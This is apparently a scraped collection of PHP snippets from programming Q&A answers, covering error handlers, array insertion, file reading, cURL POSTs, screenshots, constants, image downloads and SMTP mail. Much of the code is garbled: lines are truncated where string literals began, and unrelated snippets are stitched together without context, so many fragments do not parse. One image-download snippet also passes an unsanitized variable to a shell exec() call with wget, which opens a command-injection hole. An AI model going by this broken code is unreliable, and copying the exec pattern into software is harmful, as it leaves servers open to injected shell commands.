error_reporting(-1); assert_options(ASSERT_ACTIVE, 1); assert_options(ASSERT_WARNING, 0); assert_options(ASSERT_BAIL, 0); assert_options(ASSERT_QUIET_EVAL, 0); assert_options(ASSERT_CALLBACK, set_error_handler( set_exception_handler( register_shutdown_function( function assert_callcack($file, $line, $message) { throw new Customizable_Exception($message, null, $file, $line); } function error_handler($errno, $error, $file, $line, $vars) { if ($errno === 0 || ($errno & error_reporting()) === 0) { return; } throw new Customizable_Exception($error, $errno, $file, $line); } function exception_handler(Exception $e) { echo exit; } function shutdown_handler() { try { if (null !== $error = error_get_last()) { throw new Customizable_Exception($error[ } } catch (Exception $e) { exception_handler($e); } } class Customizable_Exception extends Exception { public function __construct($message = null, $code = null, $file = null, $line = null) { if ($code === null) { parent::__construct($message); } else { parent::__construct($message, $code); } if ($file !== null) { $this->file = $file; } if ($line !== null) { $this->line = $line; } } }
ob_start();var_dump(); user_error(ob_get_contents()); ob_get_clean();
display_errors = Off error_reporting = E_ALL display_errors = On
php*:::compile-file-entry { printf("%Y: PHP compile-file-entry:\t%s (%s)\n", walltimestamp, basename(copyinstr(arg0)), copyinstr(arg1)); } php*:::compile-file-return { printf("%Y: PHP compile-file-return:\t%s (%s)\n", walltimestamp, basename(copyinstr(arg0)), basename(copyinstr(arg1))); } php*:::error { printf("%Y: PHP error message:\t%s in %s:%d\n", walltimestamp, copyinstr(arg0), basename(copyinstr(arg1)), (int)arg2); } php*:::exception-caught { printf("%Y: PHP exception-caught:\t%s\n", walltimestamp, copyinstr(arg0)); } php*:::exception-thrown { printf("%Y: PHP exception-thrown:\t%s\n", walltimestamp, copyinstr(arg0)); } php*:::execute-entry { printf("%Y: PHP execute-entry:\t%s:%d\n", walltimestamp, basename(copyinstr(arg0)), (int)arg1); } php*:::execute-return { printf("%Y: PHP execute-return:\t%s:%d\n", walltimestamp, basename(copyinstr(arg0)), (int)arg1); } php*:::function-entry { printf("%Y: PHP function-entry:\t%s%s%s() in %s:%d\n", walltimestamp, copyinstr(arg3), copyinstr(arg4), copyinstr(arg0), basename(copyinstr(arg1)), (int)arg2); } php*:::function-return { printf("%Y: PHP function-return:\t%s%s%s() in %s:%d\n", walltimestamp, copyinstr(arg3), copyinstr(arg4), copyinstr(arg0), basename(copyinstr(arg1)), (int)arg2); } php*:::request-shutdown { printf("%Y: PHP request-shutdown:\t%s at %s via %s\n", walltimestamp, basename(copyinstr(arg0)), copyinstr(arg1), copyinstr(arg2)); } php*:::request-startup { printf("%Y, PHP request-startup:\t%s at %s via %s\n", walltimestamp, basename(copyinstr(arg0)), copyinstr(arg1), copyinstr(arg2)); }
probe process("sapi/cli/php").provider("php").mark("compile__file__entry") { printf("Probe compile__file__entry\n"); printf(" compile_file %s\n", user_string($arg1)); printf(" compile_file_translated %s\n", user_string($arg2)); } probe process("sapi/cli/php").provider("php").mark("compile__file__return") { printf("Probe compile__file__return\n"); printf(" compile_file %s\n", user_string($arg1)); printf(" compile_file_translated %s\n", user_string($arg2)); } probe process("sapi/cli/php").provider("php").mark("error") { printf("Probe error\n"); printf(" errormsg %s\n", user_string($arg1)); printf(" request_file %s\n", user_string($arg2)); printf(" lineno %d\n", $arg3); } probe process("sapi/cli/php").provider("php").mark("exception__caught") { printf("Probe exception__caught\n"); printf(" classname %s\n", user_string($arg1)); } probe process("sapi/cli/php").provider("php").mark("exception__thrown") { printf("Probe exception__thrown\n"); printf(" classname %s\n", user_string($arg1)); } probe process("sapi/cli/php").provider("php").mark("execute__entry") { printf("Probe execute__entry\n"); printf(" request_file %s\n", user_string($arg1)); printf(" lineno %d\n", $arg2); } probe process("sapi/cli/php").provider("php").mark("execute__return") { printf("Probe execute__return\n"); printf(" request_file %s\n", user_string($arg1)); printf(" lineno %d\n", $arg2); } probe process("sapi/cli/php").provider("php").mark("function__entry") { printf("Probe function__entry\n"); printf(" function_name %s\n", user_string($arg1)); printf(" request_file %s\n", user_string($arg2)); printf(" lineno %d\n", $arg3); printf(" classname %s\n", user_string($arg4)); printf(" scope %s\n", user_string($arg5)); } probe process("sapi/cli/php").provider("php").mark("function__return") { printf("Probe function__return: %s\n", user_string($arg1)); printf(" function_name %s\n", user_string($arg1)); printf(" request_file %s\n", user_string($arg2)); printf(" lineno %d\n", $arg3); printf(" classname %s\n", user_string($arg4)); printf(" scope %s\n", user_string($arg5)); } probe process("sapi/cli/php").provider("php").mark("request__shutdown") { printf("Probe request__shutdown\n"); printf(" file %s\n", user_string($arg1)); printf(" request_uri %s\n", user_string($arg2)); printf(" request_method %s\n", user_string($arg3)); } probe process("sapi/cli/php").provider("php").mark("request__startup") { printf("Probe request__startup\n"); printf(" file %s\n", user_string($arg1)); printf(" request_uri %s\n", user_string($arg2)); printf(" request_method %s\n", user_string($arg3)); }
$original = array( $inserted = array( array_splice( $original, 3, 0, $inserted );
/** * @param array $array * @param int|string $position * @param mixed $insert */ function array_insert(&$array, $position, $insert) { if (is_int($position)) { array_splice($array, $position, 0, $insert); } else { $pos = array_search($position, array_keys($array)); $array = array_merge( array_slice($array, 0, $pos), $insert, array_slice($array, $pos) ); } }
$arr = ["one", "two", "three"]; array_insert( $arr, 1, "one-half" ); array ( 0 => 1 => 2 => 3 => )
$arr = [ "name" => [ "type" => "string", "maxlength" => "30", ], "email" => [ "type" => "email", "maxlength" => "150", ], ]; array_insert( $arr, "email", [ "phone" => [ "type" => "string", "format" => "phone", ], ] ); array ( array ( ), array ( ), array ( ), )
$a = array(1, 2, 3, 4); $b = array_merge(array_slice($a, 0, 2), array(5), array_slice($a, 2));
function array_insert(&$array, $value, $index) { return $array = array_merge(array_splice($array, max(0, $index - 1)), array($value), $array); }
function insertBefore($input, $index, $element) { if (!array_key_exists($index, $input)) { throw new Exception("Index not found"); } $tmpArray = array(); $originalIndex = 0; foreach ($input as $key => $value) { if ($key === $index) { $tmpArray[] = $element; break; } $tmpArray[$key] = $value; $originalIndex++; } array_splice($input, 0, $originalIndex, $tmpArray); return $input; } function insertAfter($input, $index, $element) { if (!array_key_exists($index, $input)) { throw new Exception("Index not found"); } $tmpArray = array(); $originalIndex = 0; foreach ($input as $key => $value) { $tmpArray[$key] = $value; $originalIndex++; if ($key === $index) { $tmpArray[] = $element; break; } } array_splice($input, 0, $originalIndex, $tmpArray); return $input; }
function insertBefore($input, $index, $newKey, $element) { if (!array_key_exists($index, $input)) { throw new Exception("Index not found"); } $tmpArray = array(); foreach ($input as $key => $value) { if ($key === $index) { $tmpArray[$newKey] = $element; } $tmpArray[$key] = $value; } return $input; } function insertAfter($input, $index, $newKey, $element) { if (!array_key_exists($index, $input)) { throw new Exception("Index not found"); } $tmpArray = array(); foreach ($input as $key => $value) { $tmpArray[$key] = $value; if ($key === $index) { $tmpArray[$newKey] = $element; } } return $tmpArray; }
function insertArrayAtPosition( $array, $insert, $position ) { /* $array : The initial array i want to modify $insert : the new array i want to add, eg array( $position : the position where the new array will be inserted into. Please mind that arrays start at 0 */ return array_slice($array, 0, $position, TRUE) + $insert + array_slice($array, $position, NULL, TRUE); }
function insert(&$arr, $value, $index){ $lengh = count($arr); if($index<0||$index>$lengh) return; for($i=$lengh; $i>$index; $i--){ $arr[$i] = $arr[$i-1]; } $arr[$index] = $value; }
function array_insert(&$array,$element,$position=null) { if (count($array) == 0) { $array[] = $element; } elseif (is_numeric($position) && $position < 0) { if((count($array)+position) < 0) { $array = array_insert($array,$element,0); } else { $array[count($array)+$position] = $element; } } elseif (is_numeric($position) && isset($array[$position])) { $part1 = array_slice($array,0,$position,true); $part2 = array_slice($array,$position,null,true); $array = array_merge($part1,array($position=>$element),$part2); foreach($array as $key=>$item) { if (is_null($item)) { unset($array[$key]); } } } elseif (is_null($position)) { $array[] = $element; } elseif (!isset($array[$position])) { $array[$position] = $element; } $array = array_merge($array); return $array; }
private function arrayInsertAfterKey($array, $afterKey, $key, $value){ $pos = array_search($afterKey, array_keys($array)); return array_merge( array_slice($array, 0, $pos, $preserve_keys = true), array($key=>$value), array_slice($array, $pos, $preserve_keys = true) ); }
$original = ( [0] => Array ( [title] => Speed [width] => 14 ) [1] => Array ( [title] => Date [width] => 18 ) [2] => Array ( [title] => Pineapple [width] => 30 ) )
$new = array( ); array_splice($original,1,0,array( $original[1] = $new;
foreach ($array as $key => $value) { if($key==1) { $new_array[]=$other_array; } $new_array[]=$value; }
$elements = array( array_splice($array, $position, $length, $elements);
$element = array( $elements = array($element); array_splice($array, $position, $length, $elements);
$colors = array( $colors = insertElementToArray($colors, function insertElementToArray($arr = array(), $element = null, $index = 0) { if ($element == null) { return $arr; } $arrLength = count($arr); $j = $arrLength - 1; while ($j >= $index) { $arr[$j+1] = $arr[$j]; $j--; } $arr[$index] = $element; return $arr; }
/* * Inserts a new key/value after the key in the array. * * @param $key * The key to insert after. * @param $array * An array to insert in to. * @param $new_key * The key to insert. * @param $new_value * An value to insert. * * @return * The new array if the key exists, FALSE otherwise. * * @see array_insert_before() */ function array_insert_after($key, array &$array, $new_key, $new_value) { if (array_key_exists($key, $array)) { $new = array(); foreach ($array as $k => $value) { $new[$k] = $value; if ($k === $key) { $new[$new_key] = $new_value; } } return $new; } return FALSE; }
/* insert an element after given array key * $src = array() array to work with * $ins = array() to insert in key=>array format * $pos = key that $ins will be inserted after */ function array_insert_string_keys($src,$ins,$pos) { $counter=1; foreach($src as $key=>$s){ if($key==$pos){ break; } $counter++; } $array_head = array_slice($src,0,$counter); $array_tail = array_slice($src,$counter); $src = array_merge($array_head, $ins); $src = array_merge($src, $array_tail); return($src); }
$userfile_name = $_FILES[ $userfile_extn = explode(".", strtolower($_FILES[
$path = $_FILES[ $ext = pathinfo($path, PATHINFO_EXTENSION);
$userfile_name = $_FILES[ $userfile_extn = substr($userfile_name, strrpos($userfile_name,
$handle = fopen("inputfile.txt", "r"); if ($handle) { while (($line = fgets($handle)) !== false) { } fclose($handle); } else { }
if ($file = fopen("file.txt", "r")) { while(!feof($file)) { $line = fgets($file); } fclose($file); }
<?php $file = new SplFileObject("file.txt"); while (!$file->eof()) { echo $file->fgets(); } $file = null;
/** * @return Generator */ $fileData = function() { $file = fopen(__DIR__ . if (!$file) die( while (($line = fgets($file)) !== false) { yield $line; } fclose($file); };
$filename = "test.txt"; $source_file = fopen( $filename, "r" ) or die("Couldn while (!feof($source_file)) { $buffer = fread($source_file, 4096); $buffer = str_replace($old,$new,$buffer); }
foreach (new SplFileObject(__FILE__) as $line) { echo $line; }
$handle = fopen("some_file.txt", "r"); if ($handle) { while (($line = fgets($handle)) !== false) { $line = str_replace("\n", "", $line); } fclose($handle); }
$block =1024*1024; if ($fh = fopen("file.txt", "r")) { $left= while (!feof($fh)) { $temp = fread($fh, $block); $fgetslines = explode("\n",$temp); $fgetslines[0]=$left.$fgetslines[0]; if(!feof($fh) )$left = array_pop($lines); foreach ($fgetslines as $k => $line) { } } } fclose($fh);
$fp=fopen("/path/to/the/file", "r+"); while ($line = stream_get_line($fp, 1024 * 1024, "\n")) { echo $line; } fclose($fp);
function parse_file($filename) { try { $file = new SplFileObject($filename); } catch (LogicException $exception) { die( } while ($file->valid()) { $line = $file->fgets(); } $file = null; }
function read_file($filename = $buffer = array(); $source_file = fopen( $filename, "r" ) or die("Couldn while (!feof($source_file)) { $buffer[] = fread($source_file, 4096); } return $buffer; }
<?php $silly = echo $silly[-20]; echo $silly{-6}; echo $silly[-3]; echo $silly[-15]; echo $silly[-13]; echo $silly[-1]; echo $silly[-4]; echo $silly{-10}; echo $silly[-4]; echo $silly[-8]; echo $silly{3}; die();
$order = array("\r\n", "\n", "\r"); $string = str_replace($order, $lastchar = substr($string, -1);
<?php $string = $repetitions = 10000000; echo "\n\n"; echo "----------------------------------\n"; echo $repetitions . " repetitions...\n"; echo "----------------------------------\n"; echo "\n\n"; $start = microtime(true); for($i=0; $i<$repetitions; $i++) $x = substr($string, -1); echo "substr() took " . (microtime(true) - $start) . "seconds\n"; $start = microtime(true); for($i=0; $i<$repetitions; $i++) $x = $string[strlen($string)-1]; echo "array access took " . (microtime(true) - $start) . "seconds\n"; die();
---------------------------------- 10000000 repetitions... ---------------------------------- substr() took 2.0285921096802seconds array access took 1.7474739551544seconds
<?php echo substr("testers", -1); echo mb_substr("testers", -1); ?>
$foo = "bar"; $lastChar = strlen($foo) -1; echo $foo[$lastChar]; $firstChar = 0; echo $foo[$firstChar];
$dir = $files = scandir($dir, 1); foreach($files as $file){ $n = substr($file, -3); if($n == echo $file. } }
$cart = array(); $cart[] = 13; $cart[] = 14; $cart = array(); for($i=0;$i<=5;$i++){ $cart[] = $i; } echo "<pre>"; print_r($cart); echo "</pre>";
<?php $cart = array(); array_push($cart, 13); array_push($cart, 14); $cart = array(); array_push($cart, 13, 14); ?>
$cart = array(); $cart[] = 13; $cart[] = $cart[4] = $object; $cart[
$cart = []; $cart[] = 13; $cart[] = "foo"; $cart[] = obj;
$products_arr["passenger_details"]=array(); array_push($products_arr["passenger_details"],array("Name"=>"Isuru Eshan","E-Mail"=>"isuru.eshan@gmail.com")); echo "<pre>"; echo json_encode($products_arr,JSON_PRETTY_PRINT); echo "</pre>"; $countries = array(); $countries["DK"] = array("code"=>"DK","name"=>"Denmark","d_code"=>"+45"); $countries["DJ"] = array("code"=>"DJ","name"=>"Djibouti","d_code"=>"+253"); $countries["DM"] = array("code"=>"DM","name"=>"Dominica","d_code"=>"+1"); foreach ($countries as $country){ echo "<pre>"; echo print_r($country); echo "</pre>"; }
$matrix= array(); $matrix[count($matrix)]= $matrix[count($matrix)]= ... $matrix[count($matrix)]=
<?php $Browser = new COM( $Browserhandle = $Browser->HWND; $Browser->Visible = true; $Browser->Fullscreen = true; $Browser->Navigate( while($Browser->Busy){ com_message_pump(4000); } $img = imagegrabwindow($Browserhandle, 0); $Browser->Quit(); imagepng($img, ?>
https: url=www.stackoverflow.com/&key={your_api_key}&screenshot=true
https: url=www.stackoverflow.com/&key={your_api_key}&screenshot=true&strategy=mobile
$ sudo wget https: $ sudo unzip master.zip $ sudo mv screen-master screen $ sudo chmod +x screen/bin/phantomjs $ sudo yum install fontconfig $ sudo yum install freetype* $ cd screen $ sudo curl -sS https: $ sudo php composer.phar update $ cd .. $ sudo chown -R apache screen $ sudo chgrp -R www screen $ sudo service httpd restart
composer require urlbox/screenshots $urlbox = UrlboxRenderer::fromCredentials( $options[ $urlboxUrl = $urlbox->generateUrl($options); <img src="$urlboxUrl" />
include("GrabzItClient.class.php"); $grabzIt = new GrabzItClient("Sign in to view your Application Key", "Sign in to view your Application Secret");
$grabzIt->URLToImage("http: $grabzIt->URLToPDF("http: $grabzIt->URLToAnimation("http: $grabzIt->URLToTable("http:
<?php $url = file_get_contents("http: $file = fopen("snapshots/stack.jpg", "w+"); fwrite($file, $url); fclose($file); die("saved file!"); ?>
class foo { var $x = public $x = function bar() { } }
class Sample{ var $usingVar; public $usingPublic; function ..... }
<?php // // $ch = curl_init(); curl_setopt($ch, CURLOPT_URL,"http: curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, "postvar1=value1&postvar2=value2&postvar3=value3"); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); $server_output = curl_exec($ch); curl_close ($ch); if ($server_output == "OK") { ... } else { ... } ?>
$post = [ ]; $ch = curl_init( curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $post); $response = curl_exec($ch); curl_close($ch); var_dump($response);
<?php namespace MyApp\Http; class Curl { /** @var resource cURL handle */ private $ch; /** @var mixed The response */ private $response = false; /** * @param string $url * @param array $options */ public function __construct($url, array $options = array()) { $this->ch = curl_init($url); foreach ($options as $key => $val) { curl_setopt($this->ch, $key, $val); } curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, true); } /** * Get the response * @return string * @throws \RuntimeException On cURL error */ public function getResponse() { if ($this->response) { return $this->response; } $response = curl_exec($this->ch); $error = curl_error($this->ch); $errno = curl_errno($this->ch); if (is_resource($this->ch)) { curl_close($this->ch); } if (0 !== $errno) { throw new \RuntimeException($error, $errno); } return $this->response = $response; } /** * Let echo out the response * @return string */ public function __toString() { return $this->getResponse(); } } $curl = new \MyApp\Http\Curl( CURLOPT_POSTFIELDS => array( )); try { echo $curl; } catch (\RuntimeException $ex) { die(sprintf( }
; modify the absolute path to the cacert.pem file curl.cainfo=c:\php\cacert.pem
<?php $ch = curl_init(); $skipper = "luxury assault recreational vehicle"; $fields = array( $postvars = foreach($fields as $key=>$value) { $postvars .= $key . "=" . $value . "&"; } $url = "http: curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_POST, 1); curl_setopt($ch,CURLOPT_POSTFIELDS,$postvars); curl_setopt($ch,CURLOPT_RETURNTRANSFER, true); curl_setopt($ch,CURLOPT_CONNECTTIMEOUT ,3); curl_setopt($ch,CURLOPT_TIMEOUT, 20); $response = curl_exec($ch); print "curl response is:" . $response; curl_close ($ch); ?>
<!DOCTYPE HTML PUBLIC "- "http: <html> <head> <meta http-equiv="Content-Type" content="text/html; charset=utf-8"> <title>Title</title> <meta http-equiv="Pragma" content="no-cache"> <meta http-equiv="Expires" content="0"> <body> A mountain of content... </body> </html>
<?php $post = [ ]; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post)); $response = curl_exec($ch); var_export($response);
function curlPost($url, $data=NULL, $headers = NULL) { $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); if(!empty($data)){ curl_setopt($ch, CURLOPT_POSTFIELDS, $data); } if (!empty($headers)) { curl_setopt($ch, CURLOPT_HTTPHEADER, $headers); } $response = curl_exec($ch); if (curl_error($ch)) { trigger_error( } curl_close($ch); return $response; } curlPost( ]);
<?php include("LIB_http.php"); include("LIB_parse.php"); $product_array=array(); $product_count=0; $target = "http: $web_page = http_get($target, ""); ... ?>
curlPost( ]); function curlPost($url, $data) { $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_POSTFIELDS, $data); $response = curl_exec($ch); if (curl_error($ch)) { throw new \Exception(curl_error($ch)); } curl_close($ch); return $response; }
$index = 0; foreach($data as $key=>$val) { echo "Index is $index\n"; $index++; }
for ($i=0; $i<count($things); $i++) { ... } foreach ($things as $i=>$thing) { ... }
for ($i=0; $i<count($things); $i++) { echo "Thing ".$i." is ".$things[$i]; } foreach ($things as $i=>$thing) { echo "Thing ".$i." is ".$thing; }
foreach($array as $key => $value){ $index = current($array); }
$var = array(2,5); for ($i = 0; $i < count($var); $i++) { echo $var[$i]."\n"; }
$var = array_push($var,10); for ($i = 0; $i < count($var); $i++) { echo $var[$i]."\n"; }
foreach($arrvariable as $key=>$value){ echo "$key"; }
<?php class Test { /** @var SomeObj */ private $someObjInstance; } ?>
/** * @return SomeObj[] */ function getSomeObjects() {...}
$needles = getAllNeedles(); foreach ($needles as $needle) { $needle->... }
Type[] Type<Type> Type<Type[, Type]...> Type<Type[|Type]...>
Type<Type<Type>> Type<Type<Type[, Type]...>> Type<Type<Type[|Type]...>>
<?php $x = [new Name()]; $y = new Collection([new Name()]); $a = new Collection(); $a[] = new Model_User(); $a->resetChanges(); $a[0]->name = "George"; $a->echoChanges();
class orderCollection implements RecursiveArrayIterator
/** * [...] * @return Order */ orderCollection::current() /** * [...] * @return integer E.g. database identifier of the order */ orderCollection::key() /** * [...] * @return Order */ orderCollection::offsetGet()
orderCollection::append(Order $order) orderCollection::offsetSet(Order $order)
Class MyCollection implements Countable, Iterator, ArrayAccess { /** * @return User */ public function current() { return $this->items[$this->cursor]; } }
Class User { function printLogin() { echo $this->login; } } Abstract Class MyCollection implements Countable, Iterator, ArrayAccess { protected $items = []; public function current() { return $this->items[$this->cursor]; } } /** * @method User current() * ...rest of methods (for ArrayAccess) if needed */ Class UserCollection extends MyCollection { function add(User $user) { $this->items[] = $user; } }
$collection = new UserCollection(); $collection->add(new User(1)); $collection->add(new User(2)); $collection->add(new User(3)); foreach ($collection as $user) { $user->printLogin(); }
/** * get all Tests * * @return Test|Array $tests */ public function getAllTexts(){ return array(new Test(), new Test()); }
$tests = $controller->getAllTests(); foreach($tests as $text){ }
class MyObj { private $val; public function __construct($val) { $this->val = $val; } public function getter() { return $this->val; } } /** * @method MyObj current() */ class MyObjCollection extends ArrayIterator { public function __construct(Array $array = []) { foreach($array as $object) { if(!is_a($object, MyObj::class)) { throw new Exception( } } parent::__construct($array); } public function echoContents() { foreach($this as $key => $myObj) { echo $key . } } } $myObjCollection = new MyObjCollection([ new MyObj(1), new MyObj( new MyObj( new MyObj(23), new MyObj(array()) ]); $myObjCollection->echoContents();
<?php foreach($this->models as /** @var Model_Object_WheelModel */ $model): ?> <?php $model->getImage(); ?> <?php endforeach; ?>
private $userList = array(); $userList = User::fetchAll(); foreach ($userList as $user) { $user instanceof User; echo $user->getName(); }
$a = array( isset($a[ array_key_exists( isset($a[ array_key_exists(
if (isset($var[$key]) || isset($var) && is_array($var) && array_key_exists($key, $var)) ...
if (isset($var) && is_array($var) && array_key_exists($key, $var)) ...
$a = array( print isset($a[ print array_key_exists( print @$a[ print isset($a[ print array_key_exists( print @$a[ print isset($a[ print array_key_exists( print @$a[ print isset($a[ print array_key_exists( print @$a[
sudo ln -s /etc/php5/conf.d/mcrypt.ini /etc/php5/mods-available/mcrypt.ini
export PATH=/Applications/MAMP/bin/php/php5.4.10/bin:$PATH
sudo ln -s /etc/php5/conf.d/mcrypt.ini /etc/php5/mods-available/mcrypt.ini
sudo rm /etc/php5/mods-available/mcrypt.ini sudo apt-get purge php5-mcrypt sudo apt-get install mcrypt sudo apt-get install php5-mcrypt sudo php5enmod mcrypt
sudo add-apt-repository ppa:ondrej/php5 sudo apt-get update
Configuration File (php.ini) Path: /usr/local/etc/php/5.5 Loaded Configuration File: /usr/local/etc/php/5.5/php.ini Scan for additional .ini files in: /usr/local/etc/php/5.5/conf.d Additional .ini files parsed: (none)
mv /usr/local/etc/php/5.5/php.ini /usr/local/etc/php/5.5/php.ini.default ln -s /etc/php.ini /usr/local/etc/php/5.5/php.ini sudo apachectl restart
yum install php-mcrypt service httpd restart chown -R apache:apache apppath
export PATH=/Applications/MAMP/bin/php/php5.6.7/bin:$PATH
echo export PATH=`cat /Applications/MAMP/conf/apache/httpd.conf \ | grep php | grep -i LoadModule | head -n1 \ | sed -e
sudo apt-get install php5-mcrypt sudo php5enmod mcrypt
sudo apt-get install php-mcrypt sudo phpenmod mcrypt
sudo apt-get install php7.1-mcrypt sudo phpenmod mcrypt
define ("FRUITS", serialize (array ("apple", "cherry", "banana"))); $my_fruits = unserialize (FRUITS);
class Constants { public static $array = array( } Constants::$array[] =
class Constants { private static $array = array( public static function getArray() { return self::$array; } } $constantArray = Constants::getArray();
class app{ private static $options = array( ); public static function config($key){ return self::$options[$key]; } }
class Constants { private static $array = array(0 => public static function getArray($index = false) { return $index !== false ? self::$array[$index] : self::$array; } }
define ("FRUITS", json_encode(array ("apple", "cherry", "banana"))); $fruits = json_decode (FRUITS); var_dump($fruits);
<?php class Constant { private $data = []; public function define($constant, $value) { if (!isset($this->data[$constant])) { $this->data[$constant] = $value; } else { trigger_error("Cannot redefine constant $constant", E_USER_WARNING); } } public function __get($constant) { if (isset($this->data[$constant])) { return $this->data[$constant]; } else { trigger_error("Use of undefined constant $constant - assumed return $constant; } } public function __set($constant,$value) { $this->define($constant, $value); } } $const = new Constant;
function custom_define ($const , $array) { define($const, implode ( } function return_by_index ($index,$const = DEFAULT_ROLES) { $explodedResult = explode( if (isset ($explodedResult)) return explode( }
class UserRoles { public static function getDefaultRoles() { return array( } } initMyRoles( UserRoles::getDefaultRoles() );
class UserRoles { public static function DEFAULT_ROLES() { return array( } initMyRoles( UserRoles::DEFAULT_ROLES() );
define( ))); $domains = json_decode(GENERIC_DOMAIN); var_dump($domains);
<?php const CONSTANT = echo CONSTANT; const ANOTHER_CONST = CONSTANT. echo ANOTHER_CONST; const ANIMALS = array( echo ANIMALS[1]; define( )); echo ANIMALS[1]; ?>
class Test { const CAN = [ "can bark", "can meow", "can fly" ], ANIMALS = [ self::CAN[0] => "dog", self::CAN[1] => "cat", self::CAN[2] => "bird" ]; static function noParameter() { return self::ANIMALS[self::CAN[0]]; } static function withParameter($which, $animal) { return "who {$which}? a {$animal}."; } } echo Test::noParameter() . "s " . Test::CAN[0] . ".<br>"; echo Test::withParameter( array_keys(Test::ANIMALS)[2], Test::ANIMALS["can fly"] );
function FRUITS_ARRAY(){ return array( } function FRUITS_ARRAY(){ static $array = array( return $array; } function WHAT_ANIMAL( $key ){ static $array = ( ); return $array[ $key ]; } function ANIMAL( $key = null ){ static $array = ( ); return $key !== null ? $array[ $key ] : $array; }
define( define( $my_array = explode(MY_ARRAY_CONSTANT_DELIMETER, MY_ARRAY);
<files mypasswdfile> order allow,deny deny from all </files>
php_value mysql.default.user myusername php_value mysql.default.password mypassword php_value mysql.default.host server
<?php $db = mysqli_connect(ini_get("mysql.default.user"), ini_get("mysql.default.password"), ini_get("mysql.default.host"));
include("/outside-webroot/db_settings.php"); mysql_connect("localhost", $db_user, $db_pass); unset ($db_user, $db_pass);
<?php exit() ?> [...] Plain text data including password
$url = $img = file_put_contents($img, file_get_contents($url));
$ch = curl_init( $fp = fopen( curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch); fclose($fp);
function save_image($inPath,$outPath) { $in= fopen($inPath, "rb"); $out= fopen($outPath, "wb"); while ($chunk = fread($in,8192)) { fwrite($out, $chunk, 8192); } fclose($in); fclose($out); } save_image(
$ch = curl_init( $fp = fopen( curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_exec($ch); curl_close($ch); fclose($fp);
$tempDir = $finalDir = $imageUrl = exec("cd $tempDir && wget --quiet $imageUrl"); if (!file_exists("$tempDir/image.jpg")) { throw new Exception( } if (rename("$tempDir/image.jpg", "$finalDir/new-image-name.jpg") === false) { throw new Exception( }
$img_file= $img_file=file_get_contents($img_file); $file_loc=$_SERVER[ $file_handler=fopen($file_loc, if(fwrite($file_handler,$img_file)==false){ echo } fclose($file_handler);
$url = $img = $file = file($url); $result = file_put_contents($img, $file)
$data = file_get_contents( $img = imagecreatefromstring($data); imagepng($img,
$gamerow = mysql_fetch_array($gameresult); $playerlist = explode(",", $gamerow[
foreach ($playerlist as $key => $value) { if (empty($value)) { unset($playerlist[$key]); } } if (empty($playerlist)) { }
<?php $playerList = array(); if (!$playerList) { echo "No players"; } else { echo "Explode stuff..."; }
$ArrayOne = array("UserKeyA" => "UserValueA", "UserKeyB" => "UserValueB"); $ArrayTwo[] = "UserValue01"; $ArrayTwo[] = "UserValue02"; $ArrayThree[] = $ArrayThree[] =
$EmptyTestArray = array_filter($ArrayOne); if (!empty($EmptyTestArray)) { } else { }
$variable = array(); if( count( $variable ) == 0 ) { echo "Array is Empty"; } else { echo "Array is not Empty"; }
$gamerow = mysql_fetch_array($gameresult); if (!empty(($gamerow[ $playerlist = explode(",", $gamerow[ }else{ }
$arr = array(); if(!empty($arr)){ echo "not empty"; } else { echo "empty"; }
$ray_state = array_filter($myarray); if (empty($ray_state)) { echo } else { echo }
$catArray=array(); $catIds=explode( if(!empty($catIds[0])){ foreach($catIds as $cat_id){ $catDetail=$this->Front_Category->get_category_detail($cat_id); $catArray[]=$catDetail[ } echo implode( }
$countarr = count($newArr); $checkarr = "" ; for($x=0;$x<$countarr;$x++) { $checkarr = $newArr1[$x] ; if($checkarr != "" ) { } }
if (strncmp($string_n, $prefix, strlen($prefix)) === 0)
function has_prefix($string, $prefix) { return substr($string, 0, strlen($prefix)) == $prefix; } $url = echo echo
<?php require_once "Mail.php"; $from = "Sandra Sender <sender@example.com>"; $to = "Ramona Recipient <ramona@microsoft.com>"; $subject = "Hi!"; $body = "Hi,\n\nHow are you?"; $host = "smtp.gmail.com"; $port = "587"; $username = "testtest@gmail.com"; $password = "testtest"; $headers = array ( $smtp = Mail::factory( array ( $mail = $smtp->send($to, $headers, $body); if (PEAR::isError($mail)) { echo("<p>" . $mail->getMessage() . "</p>"); } else { echo("<p>Message successfully sent!</p>"); } ?>
require_once "Mail.php"; $from = $to = $subject = $body = "Hi,\n\nHow are you?"; $headers = array( ); $smtp = Mail::factory( )); $mail = $smtp->send($to, $headers, $body); if (PEAR::isError($mail)) { echo( } else { echo( }
<?php require_once $transport = Swift_SmtpTransport::newInstance( ->setUsername( ->setPassword( $mailer = Swift_Mailer::newInstance($transport); $message = Swift_Message::newInstance( ->setFrom(array( ->setTo(array( ->setBody( $result = $mailer->send($message); ?>
require_once $transport = Swift_SmtpTransport::newInstance( ->setUsername( ->setPassword( $mailer = Swift_Mailer::newInstance($transport); $message = Swift_Message::newInstance( ->setFrom(array( ->setTo(array( ->setBody( if ($mailer->send($message)) { echo } else { echo }
<?php date_default_timezone_set( require_once( $mail = new PHPMailer(); $body = "gdssdh"; $mail->IsSMTP(); $mail->SMTPDebug = 1; $mail->SMTPAuth = true; $mail->SMTPSecure = "ssl"; $mail->Host = "smtp.gmail.com"; $mail->Port = 465; $mail->Username = "user@gmail.com"; $mail->Password = "password"; $mail->SetFrom( $mail->Subject = "PRSPS password"; $mail->MsgHTML($body); $address = "user2@yahoo.co.in"; $mail->AddAddress($address, "user2"); if(!$mail->Send()) { echo "Mailer Error: " . $mail->ErrorInfo; } else { echo "Message sent!"; } ?>
